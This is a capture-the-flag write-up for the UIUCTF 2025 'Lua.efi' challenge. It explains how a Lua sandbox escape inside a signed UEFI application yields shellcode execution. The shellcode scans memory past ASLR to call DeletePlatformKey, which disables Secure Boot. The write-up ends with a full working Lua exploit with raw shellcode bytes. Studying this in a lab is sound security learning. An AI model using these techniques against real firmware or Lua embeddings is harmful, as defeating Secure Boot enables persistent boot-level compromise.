---
layout: default
title: Lua.efi
description: Booting an unsigned kernel using Lua from UEFI.
permalink: /writeups/lua-efi/
section: writeups
---

# Overview

Secure Boot you say? Lua running as a uefi application you say??
What about some Secure Boot war crimes???

**Challenge:** [Lua.efi](https://ctfd-2025.uiuc.tf/challenges#Lua.efi-4) (uiuctf 2025)  
# Introduction

Oh hello there! This is a write-up for Lua.efi, a UEFI challenge from UIUCTF 2025 that I and other TRX member solved. For us, this was our first time pwning UEFI, and it was a fantastic learning experience.

After downloading the attachments, we found the challenge runs in QEMU. Once started, a boot selector appears, giving us two choices:

1. Boot into Alpine
2. Start a Lua shell

Our goal is to boot into Alpine to get the flag. The catch is that Secure Boot is enabled, and the Alpine kernel is unsigned, so the firmware refuses to load it. The lua.efi application, on the other hand, is signed. This makes it our only entry point, so the plan was clear: we needed to use the Lua shell to somehow bypass the Secure Boot mechanism.

## Hold on, what even is uefi?
According to [wikipedia](https://en.wikipedia.org/wiki/UEFI) `Unified Extensible Firmware Interface is a specification for the firmware architecture of a computing platform. When a computer is powered on, the UEFI implementation is typically the first that runs, before starting the operating system`
Basically it's software that runs when your computer is booting. Its goal is to set stuff up, like initializing your RAM, detecting all your boot drives, and so on, before giving control to the OS.

In UEFI you can run any .efi binary (these are called UEFI applications), an example of this is a bootloader such as GRUB, or lua.efi if you wish...

UEFI also has its own shell that you can use, but since it wasn't necessary for this challenge, I won't discuss it, but you can find more [here](https://thelinuxcode.com/how-to-use-the-powerful-uefi-shell/).

### How does uefi booting work?

So the whole UEFI boot process is a journey. Here's the TL;DR:
- **SEC (Security Phase):** The first whisper of code that runs. It's the CPU's alarm clock, setting up a tiny bit of temporary memory.
- **PEI (Pre-EFI Initialization):** Wakes up the main hardware, like your RAM.
- **DXE (Driver Execution Environment):** The main event where drivers for all your other components get loaded.
- **BDS (Boot Device Select):** The boot manager phase. It's the code that shows you the boot menu.
- **TSL (Transient System Load):** **This is where we drop in!**  It's the pre-game lobby where you can run UEFI applications (like our lua.efi) before the main OS bootloader takes over.
- **RT (Runtime):** The OS takes the wheel, and the firmware just provides some background services.
## Back to the challenge
Allright, with the UEFI lore drop out of the way, let's get back to the main quest. By examining the provide files we can see that the author threw in some custom patches for this chall. They added ASLR to UEFI because by default it's not a thing. The Lua interpreter also got some tweaks, but they don't look relevant for the challenge.

Next up, we gotta get our debug game on. Slapping `-gdb tcp::1234 -S` into run.sh makes QEMU pause on launch, waiting for our GDB to connect.

But wait, symbols? 
We started with none. We were pwning in the dark for some hours. 😭😭😭 Thankfully, the challenge gods blessed us and the author pointed us in the right direction. Adding these magic lines to run.sh makes QEMU output logs files that tells us where modules are loaded:
```bash
-debugcon file:edk2debug.log \
-global isa-debugcon.iobase=0x402
```

Using the .debug files in edk2_artifacts, we can load the symbols for each one. To avoid doing that manually, I yoinked this script from [mebein](https://towerofhanoi.it/writeups/2022-08-15-uiuctf-2022-smm-cowsay/)

```python
import gdb
import os

class AddAllSymbols(gdb.Command):
    def __init__ (self):
        super (AddAllSymbols, self).__init__ ('add-all-symbols',
            gdb.COMMAND_OBSCURE, gdb.COMPLETE_NONE, True)

    def invoke(self, args, from_tty):
        print('Adding symbols for all EFI drivers...')

        with open('run/edk2debug.log', 'r') as f:
            for line in f:
                if line.startswith('Loading SMM driver at'):
                    line = line.split()
                    base = line[4]
                elif line.startswith('Loading driver at') or line.startswith('Loading PEIM at'):
                    line = line.split()
                    base = line[3]
                else:
                    continue

                path = 'edk2_artifacts/' + line[-1].replace('.efi', '.debug')
                if os.path.isfile(path):
                    gdb.execute('add-symbol-file ' + path + ' -readnow -o ' + base)

AddAllSymbols()
```

if you run gdb with this script `gdb -x gdbscript.gdb` once you break all symbols will be added!
```gdbscript
target remote :1234
source add_debug.py
c
add-all-symbols
```

### That is cool and all but how do we win????
Okay, so we can run Lua code. Cute. But we're here for one thing and one thing only: arbitrary shellcode execution. The hint the author left use says:
```
Feel free to use known exploits that exist in the wild to escape the lua "jail", such as
https://gist.github.com/corsix/49d770c7085e4b75f32939c6c076aad6
```
Say less.  We're using it. This exploit is goated. It gives us two god tier primitives:
1. A function to **call any address** we want.
2. An **addr_of** function to leak the memory address of any Lua object.

The plan was simple: find a way to write our shellcode into a chunk of memory, leak its address with addr_of, and then jump to it. My first thought was Lua tables...
```lua
arr = {10, 20, 30, 40}
```
...but nope, the values are scattered all over memory.
Next up: strings. I made a test string, `a = "abcdefghi"`, and checked its memory with GDB. The characters were stored contiguously right after the object's header! And the memory page was RWX! Bingo!

We can use `string.char()` to build a string byte-by-byte, basically writing our shellcode into memory.
We just need to find the offset from the address returned by `addr_of(a)` to the actual character buffer, and we can jump straight to our shellcode.
```lua
-- The exploit gives us make_CClosure, we use it to turn an address into a callable function
shellcode = make_CClosure(shellcode_addr)
shellcode()
```
I wrote a simple script to automate the process of the payload creation
```python
from pwn import *
context.arch = 'amd64'
context.bits = 64

shellcode = asm('''
nop
'''
)
print('payload = string.char(',end='')
for n,i in enumerate(shellcode):
    print(hex(i), end=' ,')
    if n %20 == 0: print()

print('0x90)')
```

### This is promising but how do we boot alpine????
When you try to boot an OS, UEFI calls the LoadImage() boot service. Under the hood, this calls [CoreLoadImageCommon](https://github.com/tianocore/edk2/blob/47e818016a8e360ccdea0c01f5af5f5d0f13de80/MdeModulePkg/Core/Dxe/Image/Image.c#L1135) This function is the gatekeeper. It loads the OS binary from the disk into memory and then, before running it, it does a vibe check.

This check happens at the call to gSecurity2->FileAuthentication().
This is a function within the UEFI security protocol that takes the OS binary we want to load, calculates its hash, and then checks that hash against two lists stored in NVRAM:

- dbx (the forbidden list): If it's on this list, you're canceled. 
- db (the guest list): If it's signed by a key on this list, you're golden. 

Since our Alpine kernel is unsigned, it's not on either list. The bouncer doesn't know you, so you're not getting in. FileAuthentication returns `EFI_SECURITY_VIOLATION`, and the boot fails.

**But what if we could just fire the bouncer?**
According to the UEFI spec, if the main "Platform Key" (PK) is deleted from the system, the firmware enters a special administrative state called [Setup Mode](https://uefi.org/specs/UEFI/2.9_A/32_Secure_Boot_and_Driver_Signing.html?highlight=setup%20mode#firmware-os-key-exchange-creating-trust-relationships). In this mode, Secure Boot is effectively disabled, and no signature checks are performed. It just lets anything boot.

So the new plan is:
1. Get code execution in lua.efi. (✅ Done)
2. Use that to call the function that deletes the Platform Key.
3. Boot into Alpine and grab the flag. 🚩

Specifically the function we are going to call is [DeletePlatformKey](https://github.com/tianocore/edk2/blob/47e818016a8e360ccdea0c01f5af5f5d0f13de80/SecurityPkg/Library/SecureBootVariableLib/SecureBootVariableLib.c#L589)

There's just one problem: ASLR. 😩 Because of memory randomization, we don't know the address of DeletePlatformKey.

Now, the big brain way to solve this would be to find the global pointers to gST (System Table) and gRT (Runtime Services Table). These tables are the heart of UEFI, containing pointers to all the standard functions. We could parse these tables to find the SetVariable function and use it to delete the PK variable. But like, who has time for that? That's way too much work. 💀

Instead, we're going with something way more stupid.🗿

If you look at the memory map in GDB with vmmap, you'll notice something real interesting. ASLR is kinda lazy here. It seems to just change the size of the very first memory mapping. All the other modules and code sections **are loaded one after the other**. This means the whole memory map just slides up or down each execution.

The first mapping ends somewhere around 0xdXXXXXX. The function we want, DeletePlatformKey, lives in a code segment that gets loaded after that (the third one). 
```vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
               0x0          0xd800000 rwxp  d800000      0 [pt_]
         0xd800000          0xda00000 r-xp   200000      0 [pt_d800]
         0xda00000          0xeaaf000 rwxp  10af000      0 [pt_da00]
         0xeaaf000          0xeab0000 rw-p     1000      0 [pt_eaaf]
         0xeab0000          0xeab6000 r-xp     6000      0 [pt_eab0]
         0xeab6000          0xeab9000 rw-p     3000      0 [pt_eab6]
         0xeab9000          0xeabb000 r-xp     2000      0 [pt_eab9]
         0xeabb000          0xeabd000 rw-p     2000      0 [pt_eabb]
         0xeabd000          0xeac3000 r-xp     6000      0 [pt_eabd]
         0xeac3000          0xeac6000 rw-p     3000      0 [pt_eac3]
         0xeac6000          0xeac8000 r-xp     2000      0 [pt_eac6]
         0xeac8000          0xeaca000 rw-p     2000      0 [pt_eac8]
         0xeaca000          0xeacf000 r-xp     5000      0 [pt_eaca]
         0xeacf000          0xead2000 rw-p     3000      0 [pt_eacf]
         0xead2000          0xead5000 r-xp     3000      0 [pt_ead2]
         0xead5000          0xead8000 rw-p     3000      0 [pt_ead5]
         0xead8000          0xeadc000 r-xp     4000      0 [pt_ead8]
         0xeadc000          0xeade000 rw-p     2000      0 [pt_eadc]
         0xeade000          0xeae1000 r-xp     3000      0 [pt_eade]
         0xeae1000          0xeae4000 rw-p     3000      0 [pt_eae1]
         0xeae4000          0xeae7000 r-xp     3000      0 [pt_eae4]
         0xeae7000          0xeaea000 rw-p     3000      0 [pt_eae7]
         0xeaea000          0xeaec000 r-xp     2000      0 [pt_eaea]
         0xeaec000          0xeaed000 rw-p     1000      0 [pt_eaec]
         0xeaed000          0xec00000 rwxp   113000      0 [pt_eaed]
         0xec00000          0xee00000 r-xp   200000      0 [pt_ec00]
         0xee00000      0x10000000000 rwxp fff1200000      0 [pt_ee00]
```
So, the plan is simple:

1. Pick a reasonable starting address (like 0xd800000).
2. Scan memory page by page (+0x1000).
3. At each page, check if it starts with the unique byte sequence (the signature) of our target function.
4. WIN WIN WIN WIN WIN WIN

Here's the shellcode that does exactly that. We find the function signature by just looking at the first 8 bytes of DeletePlatformKey in GDB.

```asm
# Bytes corresponding to the start of DeletePlatformKey
mov rcx , 0x894800000001b955
# The function start somwhere at 0xadc
mov r8, 0xd800adc     

loop:
add r8, 0x1000
cmp [r8], rcx
jne loop
call r8

# Return to the Lua interpreter
ret
```

At this point, Secure Boot is dead. 💀 We just type os.exit() in the Lua shell, which drops us back to the main boot menu. Now we can select "Boot into alpine," and this time, it works 🥳

Overall, this challenge was super fun. For our first time pwning UEFI, this was a sick learning experience. We went from knowing basically nothing to straight up murdering Secure Boot from inside a Lua script. Big props to the challenge author for cooking up something this fun. 

Full exploit
```lua
-- double as_num(GCobj* x) { return reinterpret_cast<double>(x); }
as_num = string.dump(function(...) for n = ..., ..., 0 do return n end end)
as_num = as_num:gsub("\x21", "\x17", 1) -- OP_FORPREP -> OP_JMP
as_num = assert(load(as_num))

-- uint64_t addr_of(GCobj* x) { return reinterpret_cast<uint64_t>(x); }
function addr_of(x) return as_num(x) * 2^1000 * 2^74 end

-- std::string ub8(uint64_t n) { return std::string(reinterpret_cast<char*>(&n), 8); }
function ub8(n)
  t = {}
  for i = 1, 8 do
    b = n % 256
    t[i] = string.char(b)
    n = (n - b) / 256
  end
  return table.concat(t)
end

-- void upval_assign(double func, TValue x) { reinterpret_cast<LClosure*>(func)->upvals[0]->v[0] = x; }
-- NOTE: 'local magic' is required here for the upvalue logic to work correctly.
upval_assign = string.dump(function(...)
  local magic
  (function(func, x)
    (function(func)
      magic = func
    end)(func)
    magic = x
  end)(...)
end)
upval_assign = upval_assign:gsub("(magic\x00\x01\x00\x00\x00\x01)\x00", "%1\x01", 1)
upval_assign = assert(load(upval_assign))

-- CClosure* make_CClosure(lua_CFunction f, TValue up) { CClosure* co = eval("coroutine.wrap(function()end)"); co->f = f; co->upvalue[0] = up; return co; }
function make_CClosure(f, up)
  co = coroutine.wrap(function()end)

  offsetof_CClosure_f = 24
  offsetof_CClosure_upvalue0 = 32
  sizeof_TString = 24
  offsetof_UpVal_v = 16
  offsetof_Proto_k = 16
  offsetof_LClosure_proto = 24
  upval1 = ub8(addr_of(co) + offsetof_CClosure_f)
  func1 = ub8(addr_of("\x00\x00\x00\x00\x00\x00\x00\x00") - offsetof_Proto_k) .. ub8(addr_of(upval1) + sizeof_TString - offsetof_UpVal_v)
  upval2 = ub8(addr_of(co) + offsetof_CClosure_upvalue0)
  func2 = func1:sub(1, 8) .. ub8(addr_of(upval2) + sizeof_TString - offsetof_UpVal_v)
  upval_assign((addr_of(func1) + sizeof_TString - offsetof_LClosure_proto) * 2^-1000 * 2^-74, f * 2^-1000 * 2^-74)
  upval_assign((addr_of(func2) + sizeof_TString - offsetof_LClosure_proto) * 2^-1000 * 2^-74, up)
  
  return co
end


payload = string.char(0x48 ,
0xb9 ,0x55 ,0xb9 ,0x1 ,0x0 ,0x0 ,0x0 ,0x48 ,0x89 ,0x49 ,0xc7 ,0xc0 ,0xdc ,0xa ,0x80 ,0xd ,0x49 ,0x81 ,0xc0 ,0x0 ,
0x10 ,0x0 ,0x0 ,0x49 ,0x39 ,0x8 ,0x75 ,0xf4 ,0x41 ,0xff ,0xd0 ,0xc3 ,0x90 ,0x90 ,0x90 ,0x90 ,0x90 ,0x90 ,0x90 ,0x90 ,0x90 ,0x90 ,0x90 ,0x90 ,0x90)
print()

payload_addr = addr_of(payload) + 0x18
print(string.format("payload: 0x%X", payload_addr))

win = make_CClosure(payload_addr) 
win()
os.exit(0)
```
